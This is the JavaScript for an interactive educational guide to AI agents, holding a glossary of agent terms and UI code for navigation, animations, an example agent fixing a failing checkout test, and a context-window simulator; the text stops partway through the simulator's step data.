/* lrn — The Agentic Playbook */
(() => {
  'use strict';
  const RM = matchMedia('(prefers-reduced-motion: reduce)').matches;
  const $ = (s, r = document) => r.querySelector(s);
  const $$ = (s, r = document) => [...r.querySelectorAll(s)];
  const el = (tag, cls, html) => { const e = document.createElement(tag); if (cls) e.className = cls; if (html != null) e.innerHTML = html; return e; };
  const NS = 'http://www.w3.org/2000/svg';
  const sv = (tag, a) => { const e = document.createElementNS(NS, tag); for (const k in a) e.setAttribute(k, a[k]); return e; };
  const clamp = (v, a, b) => Math.max(a, Math.min(b, v));
  const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  const store = { get(k, d) { try { const v = localStorage.getItem(k); return v ? JSON.parse(v) : d; } catch (e) { return d; } }, set(k, v) { try { localStorage.setItem(k, JSON.stringify(v)); } catch (e) { /* private mode */ } } };
  const io = 'IntersectionObserver' in window;
  const onSeen = (n, cb, m) => { if (!io) return cb(); const o = new IntersectionObserver(([e]) => { if (e.isIntersecting) { cb(); o.disconnect(); } }, { rootMargin: m || '0px 0px -10% 0px' }); o.observe(n); };

  /* ═════════ GLOSSARY DATA ═════════ */
  const G = [
    ['agent', 'Agent', 'Core', 'A system in which a language model runs tools in a loop to achieve a goal, deciding its own next step each time.'],
    ['agentic-ai', 'Agentic AI', 'Core', 'The broad family of AI systems that take actions toward goals rather than only producing text: agents, and workflows that chain models and tools.'],
    ['agent-loop', 'Agent loop', 'Core', 'The repeating cycle at the heart of an agent: the model decides on an action, the harness carries it out, the result goes back to the model, and so on until the task is done.'],
    ['workflow', 'Workflow', 'Core', 'A system where models and tools are connected along paths a programmer defined in advance. Predictable and cheap; the model does not choose the route.'],
    ['autonomy', 'Autonomy', 'Core', 'How much an AI decides and does on its own before a human reviews it. A dial from “suggests” to “works for hours unsupervised”.'],
    ['harness', 'Harness (scaffold)', 'Core', 'The software around the model that manages the conversation, offers and runs tools, enforces permissions and limits, and decides what context the model sees.'],
    ['llm', 'Large language model (LLM)', 'Core', 'A neural network trained on vast amounts of text to predict the next token. In doing so it learns to write, reason, code and follow instructions.'],
    ['foundation-model', 'Foundation model', 'Core', 'A large general-purpose model trained on broad data that can be adapted to many tasks. Most LLMs are foundation models.'],
    ['human-in-the-loop', 'Human in the loop', 'Core', 'A design where a person reviews, approves or corrects an agent at chosen points, usually before irreversible or high-stakes actions.'],
    ['agent-washing', 'Agent washing', 'Core', 'Marketing that relabels ordinary chatbots, scripts or assistants as “agents” without real autonomous decision-making. Coined by Gartner.'],
    ['coding-agent', 'Coding agent', 'Core', 'An agent that reads, writes, runs and tests code in a real repository, e.g. Claude Code, OpenAI Codex, Cursor’s agent or GitHub Copilot’s coding agent.'],
    ['deep-research', 'Deep research agent', 'Core', 'An agent that runs many searches, reads dozens of sources and writes a cited report. Offered by most major AI assistants.'],
    ['computer-use', 'Computer use', 'Core', 'The ability of a model to operate a computer through screenshots, mouse clicks and keystrokes, like a person would.'],
    ['browser-agent', 'Browser agent', 'Core', 'An agent that navigates websites, fills forms and completes tasks inside a web browser.'],
    ['copilot', 'Copilot', 'Core', 'An assistant that works alongside a person, suggesting and drafting while the person stays in control. Lower autonomy than an agent.'],

    ['token', 'Token', 'Mechanics', 'The unit models read and write: a word or piece of a word. In English, one token is roughly three-quarters of a word. Context limits and prices are counted in tokens.'],
    ['context-window', 'Context window', 'Mechanics', 'Everything the model can see in one request: instructions, tool definitions, conversation and tool results. Its maximum size is measured in tokens.'],
    ['system-prompt', 'System prompt', 'Mechanics', 'Standing instructions sent at the start of every request that set the agent’s role, rules, tools guidance and output style.'],
    ['tool', 'Tool', 'Mechanics', 'A function an agent may ask to run, such as searching, reading a file or calling an API. Described to the model by a name, description and input schema.'],
    ['tool-call', 'Tool call (function calling)', 'Mechanics', 'A structured request from the model to run a tool with specific arguments. The harness executes it; the model never runs code directly.'],
    ['tool-result', 'Tool result', 'Mechanics', 'The output of a tool call, sent back to the model as part of the conversation so it can decide what to do next.'],
    ['parallel-tools', 'Parallel tool calls', 'Mechanics', 'Several tool calls requested in one turn and executed at the same time, which makes agents much faster on independent steps.'],
    ['stop-reason', 'Stop reason', 'Mechanics', 'A field on each model response saying why it stopped: finished, wants to use a tool, hit the length limit, or declined.'],
    ['json-schema', 'JSON Schema', 'Mechanics', 'A standard way to describe the shape of data. Used to define what arguments a tool accepts, so the model’s calls can be validated.'],
    ['compaction', 'Compaction', 'Mechanics', 'Summarising older parts of a long conversation so the agent can keep working without overflowing its context window.'],
    ['reasoning-model', 'Reasoning model', 'Mechanics', 'A model trained to think through problems before answering, often between tool calls too. Most frontier models now work this way.'],
    ['effort', 'Effort', 'Mechanics', 'A setting on many current models that trades thoroughness for cost and speed. Higher effort means more thinking and usually better results on hard tasks.'],
    ['subagent', 'Subagent', 'Mechanics', 'An agent launched by another agent to handle a sub-task in its own fresh context, returning only a summary.'],
    ['memory', 'Memory', 'Mechanics', 'Information an agent keeps across steps or sessions: short-term (the context window) and long-term (notes, files or databases it can read and write).'],
    ['scratchpad', 'Scratchpad', 'Mechanics', 'A file or note where an agent records plans, findings and to-dos outside its context, so they survive compaction.'],
    ['streaming', 'Streaming', 'Mechanics', 'Receiving a model’s output token by token as it is generated, rather than waiting for the whole response.'],

    ['prompt', 'Prompt', 'Prompting', 'The text you give a model: instructions, context, examples and the request itself.'],
    ['prompt-engineering', 'Prompt engineering', 'Prompting', 'The craft of writing instructions and examples that get reliable, high-quality behaviour from a model.'],
    ['context-engineering', 'Context engineering', 'Prompting', 'Deciding everything that goes into a model’s context at each step (instructions, tools, documents, history, results) so it has exactly what it needs and little else.'],
    ['context-rot', 'Context rot', 'Prompting', 'The tendency of models to perform worse as their input grows longer, even well within their maximum context window.'],
    ['few-shot', 'Few-shot prompting', 'Prompting', 'Including a handful of worked examples in the prompt so the model can copy the pattern. Zero-shot means no examples.'],
    ['chain-of-thought', 'Chain of thought', 'Prompting', 'Having a model reason step by step before answering. Built into reasoning models; still useful to request explicitly in some cases.'],
    ['rag', 'Retrieval-augmented generation (RAG)', 'Prompting', 'Searching a knowledge base for relevant passages and adding them to the model’s context so it can answer from your data.'],
    ['embeddings', 'Embeddings', 'Prompting', 'Lists of numbers that represent the meaning of text, so similar passages sit close together. The basis of semantic search.'],
    ['vector-db', 'Vector database', 'Prompting', 'A database built to store embeddings and quickly find the passages most similar to a query.'],
    ['prompt-caching', 'Prompt caching', 'Prompting', 'Reusing the processed form of a prompt prefix that hasn’t changed, which can cut cost and latency dramatically on repeated calls.'],
    ['just-in-time', 'Just-in-time context', 'Prompting', 'Giving an agent references (paths, links, IDs) and tools to load details only when it needs them, instead of everything up front.'],
    ['definition-of-done', 'Definition of done', 'Prompting', 'An explicit statement of how you and the agent will know the task is complete: tests pass, a specific format, every claim cited.'],
    ['memory-file', 'Memory file (AGENTS.md, CLAUDE.md)', 'Prompting', 'A file of standing project instructions an agent reads at the start of every session: how to build, test, style and what to avoid.'],
    ['plan-mode', 'Plan mode', 'Prompting', 'A mode in many agent tools where the agent researches and proposes a plan for approval before making any changes.'],
    ['checkpoint', 'Checkpoint', 'Prompting', 'A planned pause where the agent reports progress or asks for approval before continuing.'],
    ['xml-tags', 'XML tags', 'Prompting', 'Labels like <context> or <rules> used to separate parts of a prompt clearly. Models follow structured prompts more reliably.'],

    ['prompt-chaining', 'Prompt chaining', 'Architecture', 'A workflow that splits a task into fixed steps, each model call working on the previous output, often with checks in between.'],
    ['routing', 'Routing', 'Architecture', 'A first step that classifies an input and sends it to a specialised prompt, tool set or model.'],
    ['parallelization', 'Parallelisation', 'Architecture', 'Running several model calls at once, either on different sections of a task (sectioning) or on the same task several times to compare (voting).'],
    ['orchestrator', 'Orchestrator–workers', 'Architecture', 'A pattern where a lead model breaks a task down dynamically, hands pieces to worker models and combines their results.'],
    ['evaluator-optimizer', 'Evaluator–optimiser', 'Architecture', 'A loop where one model produces work and another critiques it against criteria until it passes.'],
    ['multi-agent', 'Multi-agent system', 'Architecture', 'Several agents with separate contexts and roles working together, usually coordinated by a lead agent.'],
    ['react', 'ReAct', 'Architecture', 'A 2022 technique in which a model alternates between reasoning about what to do and acting with tools. The ancestor of today’s agent loop.'],
    ['reflection', 'Reflection', 'Architecture', 'Having a model review and critique its own output, then improve it.'],
    ['planning', 'Planning', 'Architecture', 'Breaking a goal into steps before acting, and revising the plan as results come in.'],
    ['handoff', 'Handoff', 'Architecture', 'Passing control of a conversation or task from one agent to another, or to a human, along with the needed context.'],

    ['aci', 'Agent-computer interface (ACI)', 'Tools', 'The tools, formats and feedback an agent uses to interact with software. Coined in the SWE-agent research; as important to agents as UI design is to people.'],
    ['mcp', 'Model Context Protocol (MCP)', 'Tools', 'An open standard, created by Anthropic in 2024 and now governed by the Agentic AI Foundation, for connecting AI applications to tools and data.'],
    ['mcp-server', 'MCP server', 'Tools', 'A program that exposes tools, resources and prompts over MCP, for example a GitHub, database or calendar connector.'],
    ['mcp-client', 'MCP host and client', 'Tools', 'The host is the AI app (an IDE, a chat app); inside it, one client per server maintains the connection and relays requests.'],
    ['a2a', 'Agent2Agent (A2A)', 'Tools', 'An open protocol, started by Google in 2025, that lets agents from different vendors discover one another and delegate tasks.'],
    ['agents-md', 'AGENTS.md', 'Tools', 'A simple, widely adopted convention: a Markdown file at a project’s root with instructions for coding agents. Now part of the Agentic AI Foundation.'],
    ['skills', 'Agent Skills', 'Tools', 'Folders of instructions, scripts and resources that an agent discovers and loads only when relevant, packaging expertise without bloating every prompt.'],
    ['structured-output', 'Structured output', 'Tools', 'Constraining a model to produce output that matches a schema exactly, such as valid JSON with required fields.'],
    ['sandbox', 'Sandbox', 'Tools', 'An isolated environment where an agent can run code or browse without being able to harm the wider system.'],
    ['code-execution', 'Code execution', 'Tools', 'A tool that lets the model write and run code, turning analysis, conversions and calculations into things it can do itself.'],

    ['frontier-model', 'Frontier model', 'Models', 'One of the most capable models available at a given time, from labs such as Anthropic, OpenAI and Google.'],
    ['open-weight', 'Open-weight model', 'Models', 'A model whose trained parameters are published so anyone can download, run and modify it on their own hardware.'],
    ['benchmark', 'Benchmark', 'Models', 'A fixed set of tasks with a scoring method, used to compare models. Useful for narrowing choices, never a substitute for your own tests.'],
    ['swe-bench', 'SWE-bench', 'Models', 'A benchmark of real GitHub issues; an agent must change the code so the project’s hidden tests pass. “Verified” is a human-checked 500-task subset.'],
    ['time-horizon', 'Time horizon', 'Models', 'METR’s measure of agent capability: the length of task (in skilled-human time) an AI can complete with 50% success.'],
    ['latency', 'Latency', 'Models', 'How long you wait for a response. For agents, the total across every step matters more than any single call.'],
    ['cost-per-task', 'Cost per completed task', 'Models', 'The full cost of getting one task done correctly, including retries and failures. The number to optimise, rather than price per token.'],
    ['fine-tuning', 'Fine-tuning', 'Models', 'Further training a model on your own examples to specialise its behaviour. Rarely the first tool to reach for with agents.'],
    ['distillation', 'Distillation', 'Models', 'Training a smaller, cheaper model to imitate a larger one on a particular task.'],
    ['multimodal', 'Multimodal', 'Models', 'Able to take in or produce more than text: images, audio, video, screenshots.'],

    ['eval', 'Eval', 'Building', 'An automated test of AI behaviour: a set of inputs, plus a way to score outputs. The foundation of reliable agent development.'],
    ['golden-dataset', 'Golden dataset', 'Building', 'A curated set of realistic inputs with known good outcomes, used to measure every change.'],
    ['error-analysis', 'Error analysis', 'Building', 'Reading real traces, labelling what went wrong, grouping and counting failure types, then fixing the most common first.'],
    ['llm-as-judge', 'LLM-as-judge', 'Building', 'Using a model with a clear rubric to grade outputs where simple code checks can’t. Should be validated against human labels.'],
    ['trace', 'Trace', 'Building', 'A complete record of one agent run: every prompt, model response, tool call, result, timing and cost.'],
    ['observability', 'Observability', 'Building', 'Collecting and inspecting traces and metrics from agents in production so you can see what they do and why.'],
    ['guardrail', 'Guardrail', 'Building', 'A check or limit around an agent: input filters, output validation, permission rules, spend caps, approval steps.'],
    ['shadow-mode', 'Shadow mode', 'Building', 'Running a new agent on real inputs without letting it act, comparing its decisions with what people actually did.'],
    ['regression', 'Regression', 'Building', 'When a change that fixes one thing breaks another. Running the full eval suite on every change catches it.'],
    ['idempotent', 'Idempotent', 'Building', 'Safe to repeat: running the same action twice has the same effect as once. Valuable for agent tools, since agents retry.'],
    ['rate-limit', 'Rate limit', 'Building', 'A cap on how many requests or tokens you can use per minute. Agents with many steps hit them sooner than chat apps.'],

    ['prompt-injection', 'Prompt injection', 'Safety', 'Text that tricks a model into following an attacker’s instructions instead of yours. The top security risk for LLM applications.'],
    ['indirect-injection', 'Indirect prompt injection', 'Safety', 'Injection hidden in content the agent reads (a web page, email, document or code comment) rather than typed by the user.'],
    ['lethal-trifecta', 'Lethal trifecta', 'Safety', 'Simon Willison’s term for the dangerous combination of access to private data, exposure to untrusted content and the ability to communicate externally.'],
    ['least-privilege', 'Least privilege', 'Safety', 'Giving an agent only the minimum access, tools and permissions its task requires.'],
    ['hallucination', 'Hallucination', 'Safety', 'A confident but false output: an invented fact, citation, tool result or claim of having done something.'],
    ['reward-hacking', 'Reward hacking', 'Safety', 'Meeting the letter of a goal while missing its point, such as making tests pass by editing the tests.'],
    ['jailbreak', 'Jailbreak', 'Safety', 'A prompt crafted to get a model to ignore its safety training or rules.'],
    ['exfiltration', 'Data exfiltration', 'Safety', 'Sending private data out of a system without permission, a typical goal of prompt-injection attacks on agents.'],
    ['sycophancy', 'Sycophancy', 'Safety', 'A model’s tendency to agree with or flatter the user rather than tell the truth.']
  ];
  const GM = Object.fromEntries(G.map(([id, t, c, d]) => [id, { id, t, c, d }]));

  /* ═════════ POPOVER ═════════ */
  const pop = $('#pop');
  let popFor = null;
  const showPop = (anchor, id) => {
    const g = GM[id]; if (!g) return;
    popFor = anchor;
    pop.innerHTML = `<b>${esc(g.t)}</b>${esc(g.d)}<br><a href="#gl-${id}" data-gl="${id}">In the glossary →</a>`;
    pop.classList.add('show');
    const r = anchor.getBoundingClientRect(), w = Math.min(320, innerWidth - 24);
    pop.style.maxWidth = w + 'px';
    const h = pop.offsetHeight;
    let left = clamp(r.left + r.width / 2 - pop.offsetWidth / 2, 12, innerWidth - pop.offsetWidth - 12);
    let top = r.top - h - 10; if (top < 64) top = r.bottom + 10;
    pop.style.left = left + 'px'; pop.style.top = top + 'px';
  };
  const hidePop = () => { pop.classList.remove('show'); popFor = null; };
  const fine = matchMedia('(hover: hover)').matches;
  const bindTerm = (n, id) => {
    n.tabIndex = 0;
    if (fine) { n.addEventListener('mouseenter', () => showPop(n, id)); n.addEventListener('mouseleave', () => setTimeout(() => { if (!pop.matches(':hover') && popFor === n) hidePop(); }, 120)); }
    n.addEventListener('click', (e) => { e.stopPropagation(); popFor === n && !fine ? hidePop() : showPop(n, id); });
    n.addEventListener('keydown', (e) => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); showPop(n, id); } if (e.key === 'Escape') hidePop(); });
  };
  pop.addEventListener('mouseleave', () => { if (fine) hidePop(); });
  document.addEventListener('click', (e) => { if (!pop.contains(e.target)) hidePop(); });
  addEventListener('scroll', () => { if (popFor) hidePop(); }, { passive: true });
  $$('dfn[data-t]').forEach((n) => bindTerm(n, n.dataset.t));
  $$('.terms').forEach((box) => box.dataset.terms.split(' ').forEach((id) => { if (!GM[id]) return; const b = el('button', '', esc(GM[id].t.replace(/ \(.*\)/, ''))); b.type = 'button'; bindTerm(b, id); box.append(b); }));

  /* ═════════ NAV: top bar, chapter map, paths ═════════ */
  const chs = $$('.ch');
  const PATHS = { use: 'Use agents', build: 'Build agents', lead: 'Lead adoption' };
  const BLURB = {
    'ch-start': 'Why agents matter, and how to read this guide',
    'ch-what': 'Definitions, autonomy and a short history',
    'ch-loop': 'Anatomy of an agent and the loop, step by step',
    'ch-uses': 'Where agents work today, and a fit test',
    'ch-delegate': 'Briefing agents like a capable new hire',
    'ch-context': 'System prompts, context engineering, effort',
    'ch-patterns': 'Chaining, routing, orchestration, loops',
    'ch-tools': 'Tool design, MCP, A2A, Skills',
    'ch-models': 'Today’s models, benchmarks and costs',
    'ch-build': 'Evals, traces, error analysis, code',
    'ch-safety': 'Prompt injection and how agents fail',
    'ch-org': 'Picking use cases and stages of adoption',
    'ch-glossary': 'Ninety-seven terms, searchable',
    'ch-learn': 'Resources and a four-week path'
  };
  /* chapter map */
  const map = $('#chMap');
  const cards = chs.map((c) => {
    const a = el('a', 'mp' + (c.classList.contains('dark') ? ' dk' : ''), `<span class="mn2">${c.dataset.ch}</span><b>${esc(c.dataset.title)}</b><small>${BLURB[c.id] || ''}</small><span class="mm"><span>${c.dataset.min === '—' ? 'Reference' : c.dataset.min + ' min'}</span></span>`);
    a.href = '#' + c.id; map.append(a); return a;
  });
  map.classList.add('stag');
  /* top bar */
  const mast = $('#mast'), ringP = $('#ringP'), nowT = $('#nowTitle'), nowN = $('#nowNum');
  const bar = $('#progress');
  let curIdx = -2;
  const go = (i) => { const c = chs[clamp(i, 0, chs.length - 1)]; c.scrollIntoView({ behavior: RM ? 'auto' : 'smooth' }); };
  $('#prevCh').onclick = () => go(curIdx <= 0 ? 0 : curIdx - 1);
  $('#nextCh').onclick = () => go(curIdx + 1);
  const onScroll = () => {
    const d = document.documentElement, y = d.scrollTop, k = y / Math.max(1, d.scrollHeight - d.clientHeight);
    bar.style.width = (k * 100).toFixed(2) + '%';
    let cur = -1;
    chs.forEach((c, i) => { if (c.getBoundingClientRect().top < 90) cur = i; });
    mast.classList.toggle('show', y > innerHeight * .7);
    if (cur >= 0) {
      const c = chs[cur], r = c.getBoundingClientRect();
      const p = clamp((90 - r.top) / Math.max(1, r.height), 0, 1);
      ringP.style.strokeDashoffset = (94.25 * (1 - p)).toFixed(2);
      mast.classList.toggle('on-dark', c.classList.contains('dark'));
    }
    if (cur !== curIdx) {
      curIdx = cur;
      const c = chs[Math.max(0, cur)];
      nowN.textContent = 'CH ' + c.dataset.ch; nowT.textContent = c.dataset.title;
      nowT.classList.remove('swap'); void nowT.offsetWidth; nowT.classList.add('swap');
      $('#prevCh').disabled = cur <= 0; $('#nextCh').disabled = cur >= chs.length - 1;
    }
  };
  addEventListener('scroll', onScroll, { passive: true }); onScroll();
  const setPath = (p) => {
    $$('.persona button').forEach((b) => b.classList.toggle('on', b.dataset.path === p));
    chs.forEach((c, i) => { const inP = !p || c.dataset.paths.split(' ').includes(p); cards[i].classList.toggle('dim', !inP); cards[i].classList.toggle('rec', !!p && inP); });
    const n = p ? chs.filter((c) => c.dataset.paths.split(' ').includes(p)) : [];
    $('#personaNote').innerHTML = p ? `Your route: <b>${n.length} chapters</b>, about ${Math.round(n.reduce((s, c) => s + (parseFloat(c.dataset.min) || 0), 0))} minutes, highlighted in the <a href="#chMap">chapter map</a>. <a href="#" id="clearPath">Show everything</a>` : 'Pick one and the chapter map below will highlight your route. You can still read everything.';
    const cp = $('#clearPath'); if (cp) cp.onclick = (e) => { e.preventDefault(); setPath(null); };
    store.set('lrn-agent-path', p);
  };
  $$('.persona button').forEach((b) => b.onclick = () => setPath(b.dataset.path));
  setPath(store.get('lrn-agent-path', null));

  /* figure numbering, in document order */
  $$('.fig > figcaption .fig-chip').forEach((c, i) => { c.textContent = 'Figure ' + (i + 1); });

  /* reveal + stagger */
  const reveal = (n) => { if (RM) n.classList.add('in'); else onSeen(n, () => n.classList.add('in')); };
  $$('.fig, .callout, .take, .models, .case, .cmp, .tpl, .evtable').forEach((n) => { n.classList.add('rv'); reveal(n); });
  $$('.how, .habits, .bench, .fails, .org, .examples, .mistakes, .check, .stages, .method, .map, .rules, .apps, .ideas').forEach((n) => { n.classList.add('stag'); [...n.children].forEach((ch, i) => ch.style.setProperty('--i', Math.min(i, 10))); reveal(n); });
  $$('.take ul').forEach((u) => [...u.children].forEach((li, i) => li.style.setProperty('--i', i)));
  $$('.ch-head, .nums, .flow, .trace, .stages').forEach(reveal);
  $$('.nums > div').forEach((d, i) => d.style.setProperty('--i', i));
  /* count-up numbers */
  $$('.nums b[data-to]').forEach((b) => {
    const to = +b.dataset.to, pre = b.dataset.pre || '', suf = b.dataset.suf || '';
    const fin = () => { b.textContent = pre + to.toLocaleString('en-US') + suf; };
    if (RM || !io) return fin();
    b.textContent = pre + '0' + suf;
    onSeen(b, () => { const t0 = performance.now(); const f = (t) => { const k = Math.min(1, (t - t0) / 1600); b.textContent = pre + Math.round(to * (1 - Math.pow(1 - k, 4))).toLocaleString('en-US') + suf; if (k < 1) requestAnimationFrame(f); }; requestAnimationFrame(f); });
  });
  /* hero parallax fade */
  const heroCopy = $('.hero-copy'), heroRun = $('.hero-run');
  if (!RM) addEventListener('scroll', () => { const y = scrollY; if (y > innerHeight * 1.2) return; heroCopy.style.transform = `translateY(${y * .12}px)`; heroCopy.style.opacity = 1 - y / (innerHeight * 1.1); heroRun.style.transform = `translateY(${y * -.06}px)`; }, { passive: true });

  /* hero network canvas */
  (() => {
    const cv = $('#net'); if (!cv) return;
    const ctx = cv.getContext('2d');
    let W, H, P = [], on = true, mx = -999, my = -999;
    const size = () => { const r = cv.getBoundingClientRect(), dpr = Math.min(2, devicePixelRatio || 1); W = r.width; H = r.height; cv.width = W * dpr; cv.height = H * dpr; ctx.setTransform(dpr, 0, 0, dpr, 0, 0); const n = Math.round(W * H / 22000); P = Array.from({ length: n }, () => ({ x: Math.random() * W, y: Math.random() * H, vx: (Math.random() - .5) * .25, vy: (Math.random() - .5) * .25, r: Math.random() * 1.6 + .8, c: Math.random() < .18 })); };
    size(); addEventListener('resize', size);
    cv.parentElement.addEventListener('pointermove', (e) => { const r = cv.getBoundingClientRect(); mx = e.clientX - r.left; my = e.clientY - r.top; });
    cv.parentElement.addEventListener('pointerleave', () => { mx = my = -999; });
    const draw = () => {
      ctx.clearRect(0, 0, W, H);
      for (const p of P) {
        if (!RM) { p.x += p.vx; p.y += p.vy; if (p.x < 0 || p.x > W) p.vx *= -1; if (p.y < 0 || p.y > H) p.vy *= -1; }
        const dx = p.x - mx, dy = p.y - my, d = Math.hypot(dx, dy); if (d < 120 && d > 0) { p.x += dx / d * .6; p.y += dy / d * .6; }
      }
      for (let i = 0; i < P.length; i++) for (let j = i + 1; j < P.length; j++) {
        const a = P[i], b = P[j], d = Math.hypot(a.x - b.x, a.y - b.y);
        if (d < 130) { ctx.strokeStyle = `rgba(64, 83, 214, ${(1 - d / 130) * .16})`; ctx.lineWidth = 1; ctx.beginPath(); ctx.moveTo(a.x, a.y); ctx.lineTo(b.x, b.y); ctx.stroke(); }
      }
      for (const p of P) { ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, 7); ctx.fillStyle = p.c ? 'rgba(255, 90, 54, .7)' : 'rgba(19, 22, 29, .28)'; ctx.fill(); }
      if (on && !RM) requestAnimationFrame(draw);
    };
    draw();
    if (io) new IntersectionObserver(([e]) => { const was = on; on = e.isIntersecting; if (on && !was) draw(); }).observe(cv);
  })();

  /* ═════════ HERO RUN ═════════ */
  (() => {
    const S = [
      [0, 'user', 'goal', 'The checkout tests are failing. Find out why and fix it.'],
      [1, 'think', 'think', 'Run the failing tests first to see the actual error.'],
      [2, 'tool', 'tool', '<code>run_tests</code>("tests/checkout")'],
      [3, 'res', 'result', '2 failed · test_discount_total: expected 90.0, got 900.0'],
      [1, 'think', 'think', 'The discount is applied as a multiplier, not a percentage. Look at pricing.'],
      [2, 'tool', 'tool', '<code>read_file</code>("src/pricing.py")'],
      [3, 'res', 'result', 'line 42 · total = price * discount'],
      [1, 'think', 'think', 'Should be price × (1 − discount ÷ 100). Fix and re-test.'],
      [2, 'tool', 'tool', '<code>edit_file</code>("src/pricing.py", line 42)'],
      [3, 'res', 'result', '1 edit applied'],
      [2, 'tool', 'tool', '<code>run_tests</code>("tests/checkout")'],
      [3, 'res', 'result', '14 passed · 0 failed'],
      [0, 'done', 'done', 'Fixed. The discount was treated as a multiplier on line 42 of pricing.py. All 14 checkout tests now pass.']
    ];
    const term = $('#term'), ring = $('#ringRun'), nodes = $$('.loop .ln'), stepEl = $('#loopStep');
    let i = 0, n = 0, timer;
    const tick = () => {
      if (i >= S.length) { i = 0; n = 0; setTimeout(() => { term.innerHTML = ''; }, 0); }
      const [ph, cls, k, txt] = S[i];
      const li = el('li', 't-' + cls, `<span class="k">${k}</span>${txt}`);
      term.append(li);
      while (term.children.length > 9) term.firstElementChild.remove();
      nodes.forEach((g) => g.classList.toggle('on', +g.dataset.i === ph));
      if (ph === 1) n++;
      stepEl.textContent = cls === 'done' ? 'done ✓' : 'step ' + Math.max(1, n);
      ring.style.strokeDashoffset = 490 - (ph + 1) / 4 * 490;
      i++;
      timer = setTimeout(tick, i >= S.length ? 4200 : cls === 'think' ? 1500 : 1100);
    };
    if (RM) { S.forEach(([, cls, k, txt]) => term.append(el('li', 't-' + cls, `<span class="k">${k}</span>${txt}`))); while (term.children.length > 9) term.firstElementChild.remove(); }
    else setTimeout(tick, 700);
  })();

  /* ═════════ FIG 1 · LADDER ═════════ */
  (() => {
    const L = [
      ['Suggests', 'Autocomplete and chat', 5, 'The AI proposes; a person decides and does everything.', 'Autocomplete in an editor; asking a chatbot to draft an email you then rewrite.', 'Very low', 'Little leverage. You still do all the work.'],
      ['Does one step', 'Single call, human applies it', 15, 'The AI produces a complete piece of work for one step, such as a function, a summary or a translation. A person checks it and moves it along.', 'Summarise this contract. Write a SQL query for this question.', 'Low', 'Errors are easy to spot because a person handles every output.'],
      ['Runs a workflow', 'Fixed steps, AI in each', 35, 'Code decides the sequence; the AI handles each step. Predictable, cheap, testable.', 'Every new support ticket is classified, drafted, checked against policy, then queued for a human.', 'Moderate', 'The path is fixed, so behaviour is predictable. Most production “AI features” live here.'],
      ['Agent with approval', 'Chooses steps, asks before acting', 60, 'The AI decides which tools to use and in what order, but pauses for approval before anything that matters.', 'A coding agent that plans, edits files and runs tests, but asks before committing or deleting.', 'Moderate', 'The sweet spot for many teams: autonomy for the tedious parts, a human gate on the risky ones.'],
      ['Autonomous agent', 'Works alone, reports back', 82, 'The AI works for minutes to hours inside a sandbox with scoped permissions, then reports results for review.', 'Background coding agents that open pull requests; research agents that return a cited report.', 'High', 'Needs good sandboxing, limits and verification, since nobody watches each step.'],
      ['Agent teams', 'Many agents, minimal oversight', 92, 'Multiple agents coordinate on large tasks, delegating to each other, with people setting goals and reviewing outcomes.', 'A lead research agent running ten subagents in parallel across sources.', 'Very high', 'Powerful for broad parallel work; expensive and hard to debug. Use deliberately.']
    ];
    const rungs = $('#rungs'), info = $('#rungInfo');
    const show = (i) => {
      $$('.rung', rungs).forEach((r, j) => { r.classList.toggle('on', j === i); r.setAttribute('aria-selected', j === i); });
      const [t, s, ai, desc, ex, risk, note] = L[i];
      const rk = ['Very low', 'Low', 'Moderate', 'High', 'Very high'].indexOf(risk) + 1;
      info.innerHTML = `<h4>Level ${i} · ${t}</h4><p>${desc}</p>
        <div class="share"><div class="share-bar"><span class="h" style="flex-basis:${100 - ai}%">${100 - ai > 14 ? 'Human decides' : ''}</span><span class="a" style="flex-basis:${ai}%">${ai > 14 ? 'AI decides' : ''}</span></div></div>
        <dl class="kv"><dt>Example</dt><dd>${ex}</dd><dt>Risk</dt><dd><span class="risk">${[1, 2, 3, 4, 5].map((k) => `<i class="${k <= rk ? 'on' : ''}"></i>`).join('')}</span> ${risk}</dd><dt>Why</dt><dd>${note}</dd></dl>`;
    };
    L.forEach(([t, s], i) => { const b = el('button', 'rung', `<span class="lv">${i}</span><span><b>${t}</b><small>${s}</small></span>`); b.setAttribute('role', 'tab'); b.onclick = () => show(i); rungs.append(b); });
    show(3);
  })();

  /* ═════════ FIG 2 · SIMULATOR ═════════ */
  (() => {
    const BASE = [['sys', 'system', 'You are a coding agent working in the repo…', 1200], ['tools', 'tools', 'run_tests · read_file · edit_file · search_code', 2400], ['user', 'user', 'The checkout tests are failing. Fix them.', 40]];
    const STEPS = [
      { t: 'The model asks for a tool', x: 'The harness sends the system prompt, tool definitions and the request. The model decides the first move is to see the actual failure, so it replies with a tool call instead of text. Stop reason: tool_use.', j: '{\n  "type": "tool_use",\n  "name": "run_tests",\n  "input": { "path": "tests/checkout" }\n}', add: [['call', 'tool_use', 'run_tests("tests/checkout")', 60]] },
      { t: 'The harness runs it', x: 'The model never executes anything itself. The harness runs the tests and appends the output as a tool result. Test output is verbose, so the context jumps.', j: '{\n  "type": "tool_result",\n  "content": "2 failed: test_discount_total\\n  expected 90.0, got 900.0 ..."\n}', add: [['res', 'result', '2 failed · expected 90.0, got 900.0 · traceback…', 1800]] },
      { t: 'It searches the code', x: 'With the whole history visible, the model reasons that the discount maths is wrong and searches for where discounts are computed.', j: '{ "name": "search_code", "input": { "query": "discount" } }', add: [['call', 'tool_use', 'search_code("discount")', 50], ['res', 'result', 'src/pricing.py:42 · src/cart.py:17', 600]] },
      { t: 'It reads the file', x: 'Reading a whole file is the biggest single cost so far. A better tool might return only the relevant lines: that is tool design as context engineering.', j: '{ "name": "read_file", "input": { "path": "src/pricing.py" } }', add: [['call', 'tool_use', 'read_file("src/pricing.py")', 40], ['res', 'result', '180 lines · line 42: total = price * discount', 3200]] },
      { t: 'It makes the fix', x: 'The model edits one line. The edit tool returns a short confirmation, which keeps the context lean.', j: '{\n  "name": "edit_file",\n  "input": {\n    "path": "src/pricing.py",\n    "old": "price * discount",\n    "new": "price * (1 - discount / 100)"\n  }\n}', add: [['call', 'tool_use', 'edit_file(pricing.py, line 42)', 90], ['res', 'result', '1 edit applied', 20]] },
      { t: 'It verifies its own work', x: 'This is the step that separates good agents from bad ones. Instead of declaring victory, it re-runs the tests: an objective check.', j: '{ "name": "run_tests", "input": { "path": "tests/checkout" } }', add: [['call', 'tool_use', 'run_tests("tests/checkout")', 60], ['res', 'result', '14 passed · 0 failed', 120]] },
